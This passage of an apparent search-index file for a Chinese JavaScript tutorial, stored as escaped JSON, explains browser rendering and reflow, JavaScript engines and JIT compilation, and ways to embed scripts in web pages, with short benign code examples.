\u6e32\u67d3\u5f15\u64ce\u7684\u4e3b\u8981\u4f5c\u7528\u662f\uff0c\u5c06\u7f51\u9875\u4ee3\u7801\u6e32\u67d3\u4e3a\u7528\u6237\u89c6\u89c9\u53ef\u4ee5\u611f\u77e5\u7684\u5e73\u9762\u6587\u6863\u3002 \u4e0d\u540c\u7684\u6d4f\u89c8\u5668\u6709\u4e0d\u540c\u7684\u6e32\u67d3\u5f15\u64ce\u3002 Firefox\uff1aGecko \u5f15\u64ce Safari\uff1aWebKit \u5f15\u64ce Chrome\uff1aBlink \u5f15\u64ce IE: Trident \u5f15\u64ce Edge: EdgeHTML \u5f15\u64ce \u6e32\u67d3\u5f15\u64ce\u5904\u7406\u7f51\u9875\uff0c\u901a\u5e38\u5206\u6210\u56db\u4e2a\u9636\u6bb5\u3002 \u89e3\u6790\u4ee3\u7801\uff1aHTML \u4ee3\u7801\u89e3\u6790\u4e3a DOM\uff0cCSS \u4ee3\u7801\u89e3\u6790\u4e3a CSSOM\uff08CSS Object Model\uff09\u3002 \u5bf9\u8c61\u5408\u6210\uff1a\u5c06 DOM \u548c CSSOM \u5408\u6210\u4e00\u68f5\u6e32\u67d3\u6811\uff08render tree\uff09\u3002 \u5e03\u5c40\uff1a\u8ba1\u7b97\u51fa\u6e32\u67d3\u6811\u7684\u5e03\u5c40\uff08layout\uff09\u3002 \u7ed8\u5236\uff1a\u5c06\u6e32\u67d3\u6811\u7ed8\u5236\u5230\u5c4f\u5e55\u3002 \u4ee5\u4e0a\u56db\u6b65\u5e76\u975e\u4e25\u683c\u6309\u987a\u5e8f\u6267\u884c\uff0c\u5f80\u5f80\u7b2c\u4e00\u6b65\u8fd8\u6ca1\u5b8c\u6210\uff0c\u7b2c\u4e8c\u6b65\u548c\u7b2c\u4e09\u6b65\u5c31\u5df2\u7ecf\u5f00\u59cb\u4e86\u3002\u6240\u4ee5\uff0c\u4f1a\u770b\u5230\u8fd9\u79cd\u60c5\u51b5\uff1a\u7f51\u9875\u7684 HTML \u4ee3\u7801\u8fd8\u6ca1\u4e0b\u8f7d\u5b8c\uff0c\u4f46\u6d4f\u89c8\u5668\u5df2\u7ecf\u663e\u793a\u51fa\u5185\u5bb9\u4e86\u3002 \u91cd\u6d41\u548c\u91cd\u7ed8 \u00b6 \u6e32\u67d3\u6811\u8f6c\u6362\u4e3a\u7f51\u9875\u5e03\u5c40\uff0c\u79f0\u4e3a\u201c\u5e03\u5c40\u6d41\u201d\uff08flow\uff09\uff1b\u5e03\u5c40\u663e\u793a\u5230\u9875\u9762\u7684\u8fd9\u4e2a\u8fc7\u7a0b\uff0c\u79f0\u4e3a\u201c\u7ed8\u5236\u201d\uff08paint\uff09\u3002\u5b83\u4eec\u90fd\u5177\u6709\u963b\u585e\u6548\u5e94\uff0c\u5e76\u4e14\u4f1a\u8017\u8d39\u5f88\u591a\u65f6\u95f4\u548c\u8ba1\u7b97\u8d44\u6e90\u3002 \u9875\u9762\u751f\u6210\u4ee5\u540e\uff0c\u811a\u672c\u64cd\u4f5c\u548c\u6837\u5f0f\u8868\u64cd\u4f5c\uff0c\u90fd\u4f1a\u89e6\u53d1\u201c\u91cd\u6d41\u201d\uff08reflow\uff09\u548c\u201c\u91cd\u7ed8\u201d\uff08repaint\uff09\u3002\u7528\u6237\u7684\u4e92\u52a8\u4e5f\u4f1a\u89e6\u53d1\u91cd\u6d41\u548c\u91cd\u7ed8\uff0c\u6bd4\u5982\u8bbe\u7f6e\u4e86\u9f20\u6807\u60ac\u505c\uff08 a:hover \uff09\u6548\u679c\u3001\u9875\u9762\u6eda\u52a8\u3001\u5728\u8f93\u5165\u6846\u4e2d\u8f93\u5165\u6587\u672c\u3001\u6539\u53d8\u7a97\u53e3\u5927\u5c0f\u7b49\u7b49\u3002 \u91cd\u6d41\u548c\u91cd\u7ed8\u5e76\u4e0d\u4e00\u5b9a\u4e00\u8d77\u53d1\u751f\uff0c\u91cd\u6d41\u5fc5\u7136\u5bfc\u81f4\u91cd\u7ed8\uff0c\u91cd\u7ed8\u4e0d\u4e00\u5b9a\u9700\u8981\u91cd\u6d41\u3002\u6bd4\u5982\u6539\u53d8\u5143\u7d20\u989c\u8272\uff0c\u53ea\u4f1a\u5bfc\u81f4\u91cd\u7ed8\uff0c\u800c\u4e0d\u4f1a\u5bfc\u81f4\u91cd\u6d41\uff1b\u6539\u53d8\u5143\u7d20\u7684\u5e03\u5c40\uff0c\u5219\u4f1a\u5bfc\u81f4\u91cd\u7ed8\u548c\u91cd\u6d41\u3002 \u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u6d4f\u89c8\u5668\u4f1a\u667a\u80fd\u5224\u65ad\uff0c\u5c06\u91cd\u6d41\u548c\u91cd\u7ed8\u53ea\u9650\u5236\u5230\u76f8\u5173\u7684\u5b50\u6811\u4e0a\u9762\uff0c\u6700\u5c0f\u5316\u6240\u8017\u8d39\u7684\u4ee3\u4ef7\uff0c\u800c\u4e0d\u4f1a\u5168\u5c40\u91cd\u65b0\u751f\u6210\u7f51\u9875\u3002 \u4f5c\u4e3a\u5f00\u53d1\u8005\uff0c\u5e94\u8be5\u5c3d\u91cf\u8bbe\u6cd5\u964d\u4f4e\u91cd\u7ed8\u7684\u6b21\u6570\u548c\u6210\u672c\u3002\u6bd4\u5982\uff0c\u5c3d\u91cf\u4e0d\u8981\u53d8\u52a8\u9ad8\u5c42\u7684 DOM \u5143\u7d20\uff0c\u800c\u4ee5\u5e95\u5c42 DOM \u5143\u7d20\u7684\u53d8\u52a8\u4ee3\u66ff\uff1b\u518d\u6bd4\u5982\uff0c\u91cd\u7ed8 table \u5e03\u5c40\u548c flex \u5e03\u5c40\uff0c\u5f00\u9500\u90fd\u4f1a\u6bd4\u8f83\u5927\u3002 1 2 3 4 var foo = document . getElementById ( 'foobar' ); foo . style . color = 'blue' ; foo . style . marginTop = '30px' ; \u4e0a\u9762\u7684\u4ee3\u7801\u53ea\u4f1a\u5bfc\u81f4\u4e00\u6b21\u91cd\u7ed8\uff0c\u56e0\u4e3a\u6d4f\u89c8\u5668\u4f1a\u7d2f\u79ef DOM \u53d8\u52a8\uff0c\u7136\u540e\u4e00\u6b21\u6027\u6267\u884c\u3002 \u4e0b\u9762\u662f\u4e00\u4e9b\u4f18\u5316\u6280\u5de7\u3002 \u8bfb\u53d6 DOM \u6216\u8005\u5199\u5165 DOM\uff0c\u5c3d\u91cf\u5199\u5728\u4e00\u8d77\uff0c\u4e0d\u8981\u6df7\u6742\u3002\u4e0d\u8981\u8bfb\u53d6\u4e00\u4e2a DOM \u8282\u70b9\uff0c\u7136\u540e\u7acb\u523b\u5199\u5165\uff0c\u63a5\u7740\u518d\u8bfb\u53d6\u4e00\u4e2a DOM \u8282\u70b9\u3002 \u7f13\u5b58 DOM \u4fe1\u606f\u3002 \u4e0d\u8981\u4e00\u9879\u4e00\u9879\u5730\u6539\u53d8\u6837\u5f0f\uff0c\u800c\u662f\u4f7f\u7528 CSS class \u4e00\u6b21\u6027\u6539\u53d8\u6837\u5f0f\u3002 \u4f7f\u7528 documentFragment \u64cd\u4f5c DOM \u52a8\u753b\u4f7f\u7528 absolute \u5b9a\u4f4d\u6216 fixed \u5b9a\u4f4d\uff0c\u8fd9\u6837\u53ef\u4ee5\u51cf\u5c11\u5bf9\u5176\u4ed6\u5143\u7d20\u7684\u5f71\u54cd\u3002 \u53ea\u5728\u5fc5\u8981\u65f6\u624d\u663e\u793a\u9690\u85cf\u5143\u7d20\u3002 \u4f7f\u7528 window.requestAnimationFrame() \uff0c\u56e0\u4e3a\u5b83\u53ef\u4ee5\u628a\u4ee3\u7801\u63a8\u8fdf\u5230\u4e0b\u4e00\u6b21\u91cd\u7ed8\u4e4b\u524d\u6267\u884c\uff0c\u800c\u4e0d\u662f\u7acb\u5373\u8981\u6c42\u9875\u9762\u91cd\u7ed8\u3002 \u4f7f\u7528\u865a\u62df DOM\uff08virtual DOM\uff09\u5e93\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a window.requestAnimationFrame() \u5bf9\u6bd4\u6548\u679c\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // \u91cd\u6d41\u4ee3\u4ef7\u9ad8 function doubleHeight ( element ) { var currentHeight = element . clientHeight ; element . style . height = ( currentHeight * 2 ) + 'px' ; } all_my_elements . forEach ( doubleHeight ); // \u91cd\u7ed8\u4ee3\u4ef7\u4f4e function doubleHeight ( element ) { var currentHeight = element . clientHeight ; window . requestAnimationFrame ( function () { element . style . height = ( currentHeight * 2 ) + 'px' ; }); } all_my_elements . forEach ( doubleHeight ); \u4e0a\u9762\u7684\u7b2c\u4e00\u6bb5\u4ee3\u7801\uff0c\u6bcf\u8bfb\u4e00\u6b21 DOM\uff0c\u5c31\u5199\u5165\u65b0\u7684\u503c\uff0c\u4f1a\u9020\u6210\u4e0d\u505c\u7684\u91cd\u6392\u548c\u91cd\u6d41\u3002\u7b2c\u4e8c\u6bb5\u4ee3\u7801\u628a\u6240\u6709\u7684\u5199\u64cd\u4f5c\uff0c\u90fd\u7d2f\u79ef\u5728\u4e00\u8d77\uff0c\u4ece\u800c DOM \u4ee3\u7801\u53d8\u52a8\u7684\u4ee3\u4ef7\u5c31\u6700\u5c0f\u5316\u4e86\u3002 JavaScript \u5f15\u64ce \u00b6 JavaScript \u5f15\u64ce\u7684\u4e3b\u8981\u4f5c\u7528\u662f\uff0c\u8bfb\u53d6\u7f51\u9875\u4e2d\u7684 JavaScript \u4ee3\u7801\uff0c\u5bf9\u5176\u5904\u7406\u540e\u8fd0\u884c\u3002 JavaScript \u662f\u4e00\u79cd\u89e3\u91ca\u578b\u8bed\u8a00\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u5b83\u4e0d\u9700\u8981\u7f16\u8bd1\uff0c\u7531\u89e3\u91ca\u5668\u5b9e\u65f6\u8fd0\u884c\u3002\u8fd9\u6837\u7684\u597d\u5904\u662f\u8fd0\u884c\u548c\u4fee\u6539\u90fd\u6bd4\u8f83\u65b9\u4fbf\uff0c\u5237\u65b0\u9875\u9762\u5c31\u53ef\u4ee5\u91cd\u65b0\u89e3\u91ca\uff1b\u7f3a\u70b9\u662f\u6bcf\u6b21\u8fd0\u884c\u90fd\u8981\u8c03\u7528\u89e3\u91ca\u5668\uff0c\u7cfb\u7edf\u5f00\u9500\u8f83\u5927\uff0c\u8fd0\u884c\u901f\u5ea6\u6162\u4e8e\u7f16\u8bd1\u578b\u8bed\u8a00\u3002 \u4e3a\u4e86\u63d0\u9ad8\u8fd0\u884c\u901f\u5ea6\uff0c\u76ee\u524d\u7684\u6d4f\u89c8\u5668\u90fd\u5c06 JavaScript \u8fdb\u884c\u4e00\u5b9a\u7a0b\u5ea6\u7684\u7f16\u8bd1\uff0c\u751f\u6210\u7c7b\u4f3c\u5b57\u8282\u7801\uff08bytecode\uff09\u7684\u4e2d\u95f4\u4ee3\u7801\uff0c\u4ee5\u63d0\u9ad8\u8fd0\u884c\u901f\u5ea6\u3002 \u65e9\u671f\uff0c\u6d4f\u89c8\u5668\u5185\u90e8\u5bf9 JavaScript \u7684\u5904\u7406\u8fc7\u7a0b\u5982\u4e0b\uff1a \u8bfb\u53d6\u4ee3\u7801\uff0c\u8fdb\u884c\u8bcd\u6cd5\u5206\u6790\uff08Lexical analysis\uff09\uff0c\u5c06\u4ee3\u7801\u5206\u89e3\u6210\u8bcd\u5143\uff08token\uff09\u3002 \u5bf9\u8bcd\u5143\u8fdb\u884c\u8bed\u6cd5\u5206\u6790\uff08parsing\uff09\uff0c\u5c06\u4ee3\u7801\u6574\u7406\u6210\u201c\u8bed\u6cd5\u6811\u201d\uff08syntax tree\uff09\u3002 \u4f7f\u7528\u201c\u7ffb\u8bd1\u5668\u201d\uff08translator\uff09\uff0c\u5c06\u4ee3\u7801\u8f6c\u4e3a\u5b57\u8282\u7801\uff08bytecode\uff09\u3002 \u4f7f\u7528\u201c\u5b57\u8282\u7801\u89e3\u91ca\u5668\u201d\uff08bytecode interpreter\uff09\uff0c\u5c06\u5b57\u8282\u7801\u8f6c\u4e3a\u673a\u5668\u7801\u3002 \u9010\u884c\u89e3\u91ca\u5c06\u5b57\u8282\u7801\u8f6c\u4e3a\u673a\u5668\u7801\uff0c\u662f\u5f88\u4f4e\u6548\u7684\u3002\u4e3a\u4e86\u63d0\u9ad8\u8fd0\u884c\u901f\u5ea6\uff0c\u73b0\u4ee3\u6d4f\u89c8\u5668\u6539\u4e3a\u91c7\u7528\u201c\u5373\u65f6\u7f16\u8bd1\u201d\uff08Just In Time compiler\uff0c\u7f29\u5199 JIT\uff09\uff0c\u5373\u5b57\u8282\u7801\u53ea\u5728\u8fd0\u884c\u65f6\u7f16\u8bd1\uff0c\u7528\u5230\u54ea\u4e00\u884c\u5c31\u7f16\u8bd1\u54ea\u4e00\u884c\uff0c\u5e76\u4e14\u628a\u7f16\u8bd1\u7ed3\u679c\u7f13\u5b58\uff08inline cache\uff09\u3002\u901a\u5e38\uff0c\u4e00\u4e2a\u7a0b\u5e8f\u88ab\u7ecf\u5e38\u7528\u5230\u7684\uff0c\u53ea\u662f\u5176\u4e2d\u4e00\u5c0f\u90e8\u5206\u4ee3\u7801\uff0c\u6709\u4e86\u7f13\u5b58\u7684\u7f16\u8bd1\u7ed3\u679c\uff0c\u6574\u4e2a\u7a0b\u5e8f\u7684\u8fd0\u884c\u901f\u5ea6\u5c31\u4f1a\u663e\u8457\u63d0\u5347\u3002 \u5b57\u8282\u7801\u4e0d\u80fd\u76f4\u63a5\u8fd0\u884c\uff0c\u800c\u662f\u8fd0\u884c\u5728\u4e00\u4e2a\u865a\u62df\u673a\uff08Virtual Machine\uff09\u4e4b\u4e0a\uff0c\u4e00\u822c\u4e5f\u628a\u865a\u62df\u673a\u79f0\u4e3a JavaScript \u5f15\u64ce\u3002\u5e76\u975e\u6240\u6709\u7684 JavaScript \u865a\u62df\u673a\u8fd0\u884c\u65f6\u90fd\u6709\u5b57\u8282\u7801\uff0c\u6709\u7684 JavaScript \u865a\u62df\u673a\u57fa\u4e8e\u6e90\u7801\uff0c\u5373\u53ea\u8981\u6709\u53ef\u80fd\uff0c\u5c31\u901a\u8fc7 JIT\uff08just in time\uff09\u7f16\u8bd1\u5668\u76f4\u63a5\u628a\u6e90\u7801\u7f16\u8bd1\u6210\u673a\u5668\u7801\u8fd0\u884c\uff0c\u7701\u7565\u5b57\u8282\u7801\u6b65\u9aa4\u3002\u8fd9\u4e00\u70b9\u4e0e\u5176\u4ed6\u91c7\u7528\u865a\u62df\u673a\uff08\u6bd4\u5982 Java\uff09\u7684\u8bed\u8a00\u4e0d\u5c3d\u76f8\u540c\u3002\u8fd9\u6837\u505a\u7684\u76ee\u7684\uff0c\u662f\u4e3a\u4e86\u5c3d\u53ef\u80fd\u5730\u4f18\u5316\u4ee3\u7801\u3001\u63d0\u9ad8\u6027\u80fd\u3002\u4e0b\u9762\u662f\u76ee\u524d\u6700\u5e38\u89c1\u7684\u4e00\u4e9b JavaScript \u865a\u62df\u673a\uff1a Chakra (Microsoft Internet Explorer) Nitro/JavaScript Core (Safari) Carakan (Opera) SpiderMonkey (Firefox) V8 (Chrome, Chromium) \u53c2\u8003\u94fe\u63a5 \u00b6 John Dalziel, The race for speed part 2: How JavaScript compilers work Jake Archibald, Deep dive into the murky waters of script loading Mozilla Developer Network, window.setTimeout Remy Sharp, Throttling function calls Ayman Farhat, An alternative to JavaScript's evil setInterval Ilya Grigorik, Script-injected \"async scripts\" considered harmful Axel Rauschmayer, ECMAScript 6 promises (\u00bd): foundations Daniel Imms, async vs defer attributes Craig Buckler, Load Non-blocking JavaScript with HTML5 Async and Defer Domenico De Felice, How browsers work","title":"\u6d4f\u89c8\u5668\u6a21\u578b\u6982\u8ff0"},{"location":"bom/engine/#_1","text":"JavaScript \u662f\u6d4f\u89c8\u5668\u7684\u5185\u7f6e\u811a\u672c\u8bed\u8a00\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u6d4f\u89c8\u5668\u5185\u7f6e\u4e86 JavaScript \u5f15\u64ce\uff0c\u5e76\u4e14\u63d0\u4f9b\u5404\u79cd\u63a5\u53e3\uff0c\u8ba9 JavaScript \u811a\u672c\u53ef\u4ee5\u63a7\u5236\u6d4f\u89c8\u5668\u7684\u5404\u79cd\u529f\u80fd\u3002\u4e00\u65e6\u7f51\u9875\u5185\u5d4c\u4e86 JavaScript \u811a\u672c\uff0c\u6d4f\u89c8\u5668\u52a0\u8f7d\u7f51\u9875\uff0c\u5c31\u4f1a\u53bb\u6267\u884c\u811a\u672c\uff0c\u4ece\u800c\u8fbe\u5230\u64cd\u4f5c\u6d4f\u89c8\u5668\u7684\u76ee\u7684\uff0c\u5b9e\u73b0\u7f51\u9875\u7684\u5404\u79cd\u52a8\u6001\u6548\u679c\u3002 \u672c\u7ae0\u5f00\u59cb\u4ecb\u7ecd\u6d4f\u89c8\u5668\u63d0\u4f9b\u7684\u5404\u79cd JavaScript \u63a5\u53e3\u3002\u9996\u5148\uff0c\u4ecb\u7ecd JavaScript \u4ee3\u7801\u5d4c\u5165\u7f51\u9875\u7684\u65b9\u6cd5\u3002","title":"\u6d4f\u89c8\u5668\u73af\u5883\u6982\u8ff0"},{"location":"bom/engine/#_2","text":"\u7f51\u9875\u4e2d\u5d4c\u5165 JavaScript \u4ee3\u7801\uff0c\u4e3b\u8981\u6709\u56db\u79cd\u65b9\u6cd5\u3002 <script> \u5143\u7d20\u76f4\u63a5\u5d4c\u5165\u4ee3\u7801\u3002 <script> \u6807\u7b7e\u52a0\u8f7d\u5916\u90e8\u811a\u672c \u4e8b\u4ef6\u5c5e\u6027 URL \u534f\u8bae","title":"\u4ee3\u7801\u5d4c\u5165\u7f51\u9875\u7684\u65b9\u6cd5"},{"location":"bom/engine/#script","text":"<script> \u5143\u7d20\u5185\u90e8\u53ef\u4ee5\u76f4\u63a5\u5199\u5165 JavaScript \u4ee3\u7801\u3002 1 2 3 4 < script > var x = 1 + 5 ; console . log ( x ); </ script > <script> \u6807\u7b7e\u6709\u4e00\u4e2a type \u5c5e\u6027\uff0c\u7528\u6765\u6307\u5b9a\u811a\u672c\u7c7b\u578b\u3002\u5bf9 JavaScript \u811a\u672c\u6765\u8bf4\uff0c type \u5c5e\u6027\u53ef\u4ee5\u8bbe\u4e3a\u4e24\u79cd\u503c\u3002 text/javascript \uff1a\u8fd9\u662f\u9ed8\u8ba4\u503c\uff0c\u4e5f\u662f\u5386\u53f2\u4e0a\u4e00\u8d2f\u8bbe\u5b9a\u7684\u503c\u3002\u5982\u679c\u4f60\u7701\u7565 type \u5c5e\u6027\uff0c\u9ed8\u8ba4\u5c31\u662f\u8fd9\u4e2a\u503c\u3002\u5bf9\u4e8e\u8001\u5f0f\u6d4f\u89c8\u5668\uff0c\u8bbe\u4e3a\u8fd9\u4e2a\u503c\u6bd4\u8f83\u597d\u3002 application/javascript \uff1a\u5bf9\u4e8e\u8f83\u65b0\u7684\u6d4f\u89c8\u5668\uff0c\u5efa\u8bae\u8bbe\u4e3a\u8fd9\u4e2a\u503c\u3002 1 2 3 < script type = \"application/javascript\" > console . log ( 'Hello World' ); </ script > \u7531\u4e8e <script> \u6807\u7b7e\u9ed8\u8ba4\u5c31\u662f JavaScript \u4ee3\u7801\u3002\u6240\u4ee5\uff0c\u5d4c\u5165 JavaScript \u811a\u672c\u65f6\uff0c type \u5c5e\u6027\u53ef\u4ee5\u7701\u7565\u3002 \u5982\u679c type \u5c5e\u6027\u7684\u503c\uff0c\u6d4f\u89c8\u5668\u4e0d\u8ba4\u8bc6\uff0c\u90a3\u4e48\u5b83\u4e0d\u4f1a\u6267\u884c\u5176\u4e2d\u7684\u4ee3\u7801\u3002\u5229\u7528\u8fd9\u4e00\u70b9\uff0c\u53ef\u4ee5\u5728 <script> \u6807\u7b7e\u4e4b\u4e2d\u5d4c\u5165\u4efb\u610f\u7684\u6587\u672c\u5185\u5bb9\uff0c\u53ea\u8981\u52a0\u4e0a\u4e00\u4e2a\u6d4f\u89c8\u5668\u4e0d\u8ba4\u8bc6\u7684 type \u5c5e\u6027\u5373\u53ef\u3002 1 2 3 < script id = \"mydata\" type = \"x-custom-data\" > console . log ( 'Hello World' ); </ script > \u4e0a\u9762\u7684\u4ee3\u7801\uff0c\u6d4f\u89c8\u5668\u4e0d\u4f1a\u6267\u884c\uff0c\u4e5f\u4e0d\u4f1a\u663e\u793a\u5b83\u7684\u5185\u5bb9\uff0c\u56e0\u4e3a\u4e0d\u8ba4\u8bc6\u5b83\u7684 type \u5c5e\u6027\u3002\u4f46\u662f\uff0c\u8fd9\u4e2a <script> \u8282\u70b9\u4f9d\u7136\u5b58\u5728\u4e8e DOM \u4e4b\u4e2d\uff0c\u53ef\u4ee5\u4f7f\u7528 <script> \u8282\u70b9\u7684 text \u5c5e\u6027\u8bfb\u51fa\u5b83\u7684\u5185\u5bb9\u3002 1 2 document . getElementById ( 'mydata' ). text // console.log('Hello World');","title":"script \u5143\u7d20\u5d4c\u5165\u4ee3\u7801"},{"location":"bom/engine/#script_1","text":"<script> \u6807\u7b7e\u4e5f\u53ef\u4ee5\u6307\u5b9a\u52a0\u8f7d\u5916\u90e8\u7684\u811a\u672c\u6587\u4ef6\u3002 1 < script src = \"https://www.example.com/script.js\" ></ script > \u5982\u679c\u811a\u672c\u6587\u4ef6\u4f7f\u7528\u4e86\u975e\u82f1\u8bed\u5b57\u7b26\uff0c\u8fd8\u5e94\u8be5\u6ce8\u660e\u5b57\u7b26\u7684\u7f16\u7801\u3002 1 < script charset = \"utf-8\" src = \"https://www.example.com/script.js\" ></ script > \u6240\u52a0\u8f7d\u7684\u811a\u672c\u5fc5\u987b\u662f\u7eaf\u7684 JavaScript \u4ee3\u7801\uff0c\u4e0d\u80fd\u6709 HTML \u4ee3\u7801\u548c <script> \u6807\u7b7e\u3002 \u52a0\u8f7d\u5916\u90e8\u811a\u672c\u548c\u76f4\u63a5\u6dfb\u52a0\u4ee3\u7801\u5757\uff0c\u8fd9\u4e24\u79cd\u65b9\u6cd5\u4e0d\u80fd\u6df7\u7528\u3002\u4e0b\u9762\u4ee3\u7801\u7684 console.log \u8bed\u53e5\u76f4\u63a5\u88ab\u5ffd\u7565\u3002 1 2 3 < script charset = \"utf-8\" src = \"example.js\" > console . log ( 'Hello World!' ); </ script > \u4e3a\u4e86\u9632\u6b62\u653b\u51fb\u8005\u7be1\u6539\u5916\u90e8\u811a\u672c\uff0c script \u6807\u7b7e\u5141\u8bb8\u8bbe\u7f6e\u4e00\u4e2a integrity \u5c5e\u6027\uff0c\u5199\u5165\u8be5\u5916\u90e8\u811a\u672c\u7684 Hash \u7b7e\u540d\uff0c\u7528\u6765\u9a8c\u8bc1\u811a\u672c\u7684\u4e00\u81f4\u6027\u3002 1 2 3 < script src = \"/assets/application.js\" integrity = \"sha256-TvVUHzSfftWg1rcfL6TIJ0XKEGrgLyEq6lEpcmrG9qs=\" > </ script > \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c script \u6807\u7b7e\u6709\u4e00\u4e2a integrity \u5c5e\u6027\uff0c\u6307\u5b9a\u4e86\u5916\u90e8\u811a\u672c /assets/application.js \u7684 SHA256 \u7b7e\u540d\u3002\u4e00\u65e6\u6709\u4eba\u6539\u4e86\u8fd9\u4e2a\u811a\u672c\uff0c\u5bfc\u81f4 SHA256 \u7b7e\u540d\u4e0d\u5339\u914d\uff0c\u6d4f\u89c8\u5668\u5c31\u4f1a\u62d2\u7edd\u52a0\u8f7d\u3002","title":"script \u5143\u7d20\u52a0\u8f7d\u5916\u90e8\u811a\u672c"},{"location":"bom/engine/#_3","text":"\u7f51\u9875\u5143\u7d20\u7684\u4e8b\u4ef6\u5c5e\u6027\uff08\u6bd4\u5982 onclick \u548c onmouseover \uff09\uff0c\u53ef\u4ee5\u5199\u5165 JavaScript \u4ee3\u7801\u3002\u5f53\u6307\u5b9a\u4e8b\u4ef6\u53d1\u751f\u65f6\uff0c\u5c31\u4f1a\u8c03\u7528\u8fd9\u4e9b\u4ee3\u7801\u3002 1 < button id = \"myBtn\" onclick = \"console.log(this.id)\" > \u70b9\u51fb </ button > \u4e0a\u9762\u7684\u4e8b\u4ef6\u5c5e\u6027\u4ee3\u7801\u53ea\u6709\u4e00\u4e2a\u8bed\u53e5\u3002\u5982\u679c\u6709\u591a\u4e2a\u8bed\u53e5\uff0c\u4f7f\u7528\u5206\u53f7\u5206\u9694\u5373\u53ef\u3002","title":"\u4e8b\u4ef6\u5c5e\u6027"},{"location":"bom/engine/#url","text":"URL \u652f\u6301 javascript: \u534f\u8bae\uff0c\u5373\u5728 URL \u7684\u4f4d\u7f6e\u5199\u5165\u4ee3\u7801\uff0c\u4f7f\u7528\u8fd9\u4e2a URL \u7684\u65f6\u5019\u5c31\u4f1a\u6267\u884c JavaScript \u4ee3\u7801\u3002 1 < a href = \"javascript:console.log('Hello')\" > \u70b9\u51fb </ a > \u6d4f\u89c8\u5668\u7684\u5730\u5740\u680f\u4e5f\u53ef\u4ee5\u6267\u884c javascript: \u534f\u8bae\u3002\u5c06 javascript:console.log('Hello') \u653e\u5165\u5730\u5740\u680f\uff0c\u6309\u56de\u8f66\u952e\u4e5f\u4f1a\u6267\u884c\u8fd9\u6bb5\u4ee3\u7801\u3002 \u5982\u679c JavaScript \u4ee3\u7801\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u6d4f\u89c8\u5668\u5c31\u4f1a\u65b0\u5efa\u4e00\u4e2a\u6587\u6863\uff0c\u5c55\u793a\u8fd9\u4e2a\u5b57\u7b26\u4e32\u7684\u5185\u5bb9\uff0c\u539f\u6709\u6587\u6863\u7684\u5185\u5bb9\u90fd\u4f1a\u6d88\u5931\u3002 1 < a href = \"javascript: new Date().toLocaleTimeString();\" > \u70b9\u51fb </ a > \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7528\u6237\u70b9\u51fb\u94fe\u63a5\u4ee5\u540e\uff0c\u4f1a\u6253\u5f00\u4e00\u4e2a\u65b0\u6587\u6863\uff0c\u91cc\u9762\u6709\u5f53\u524d\u65f6\u95f4\u3002 \u5982\u679c\u8fd4\u56de\u7684\u4e0d\u662f\u5b57\u7b26\u4e32\uff0c\u90a3\u4e48\u6d4f\u89c8\u5668\u4e0d\u4f1a\u65b0\u5efa\u6587\u6863\uff0c\u4e5f\u4e0d\u4f1a\u8df3\u8f6c\u3002 1 < a href = \"javascript: console.log(new Date().toLocaleTimeString())\" > \u70b9\u51fb < /a> \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7528\u6237\u70b9\u51fb\u94fe\u63a5\u540e\uff0c\u7f51\u9875\u4e0d\u4f1a\u8df3\u8f6c\uff0c\u53ea\u4f1a\u5728\u63a7\u5236\u53f0\u663e\u793a\u5f53\u524d\u65f6\u95f4\u3002 javascript: \u534f\u8bae\u7684\u5e38\u89c1\u7528\u9014\u662f\u4e66\u7b7e\u811a\u672c Bookmarklet\u3002\u7531\u4e8e\u6d4f\u89c8\u5668\u7684\u4e66\u7b7e\u4fdd\u5b58\u7684\u662f\u4e00\u4e2a\u7f51\u5740\uff0c\u6240\u4ee5 javascript: \u7f51\u5740\u4e5f\u53ef\u4ee5\u4fdd\u5b58\u5728\u91cc\u9762\uff0c\u7528\u6237\u9009\u62e9\u8fd9\u4e2a\u4e66\u7b7e\u7684\u65f6\u5019\uff0c\u5c31\u4f1a\u5728\u5f53\u524d\u9875\u9762\u6267\u884c\u8fd9\u4e2a\u811a\u672c\u3002\u4e3a\u4e86\u9632\u6b62\u4e66\u7b7e\u66ff\u6362\u6389\u5f53\u524d\u6587\u6863\uff0c\u53ef\u4ee5\u5728\u811a\u672c\u524d\u52a0\u4e0a void \uff0c\u6216\u8005\u5728\u811a\u672c\u6700\u540e\u52a0\u4e0a void 0 \u3002 1 2 < a href = \"javascript: void new Date().toLocaleTimeString();\" > \u70b9\u51fb </ a > < a href = \"javascript: new Date().toLocaleTimeString();void 0;\" > \u70b9\u51fb </ a > \u4e0a\u9762\u8fd9\u4e24\u79cd\u5199\u6cd5\uff0c\u70b9\u51fb\u94fe\u63a5\u540e\uff0c\u6267\u884c\u4ee3\u7801\u90fd\u4e0d\u4f1a\u7f51\u9875\u8df3\u8f6c\u3002","title":"URL \u534f\u8bae"},{"location":"bom/engine/#script_2","text":"","title":"script \u5143\u7d20"},{"location":"bom/engine/#_4","text":"\u6d4f\u89c8\u5668\u52a0\u8f7d JavaScript \u811a\u672c\uff0c\u4e3b\u8981\u901a\u8fc7 <script> \u5143\u7d20\u5b8c\u6210\u3002\u6b63\u5e38\u7684\u7f51\u9875\u52a0\u8f7d\u6d41\u7a0b\u662f\u8fd9\u6837\u7684\u3002 \u6d4f\u89c8\u5668\u4e00\u8fb9\u4e0b\u8f7d HTML \u7f51\u9875\uff0c\u4e00\u8fb9\u5f00\u59cb\u89e3\u6790\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u4e0d\u7b49\u5230\u4e0b\u8f7d\u5b8c\uff0c\u5c31\u5f00\u59cb\u89e3\u6790\u3002 \u89e3\u6790\u8fc7\u7a0b\u4e2d\uff0c\u6d4f\u89c8\u5668\u53d1\u73b0 <script> \u5143\u7d20\uff0c\u5c31\u6682\u505c\u89e3\u6790\uff0c\u628a\u7f51\u9875\u6e32\u67d3\u7684\u63a7\u5236\u6743\u8f6c\u4ea4\u7ed9 JavaScript \u5f15\u64ce\u3002 \u5982\u679c <script> 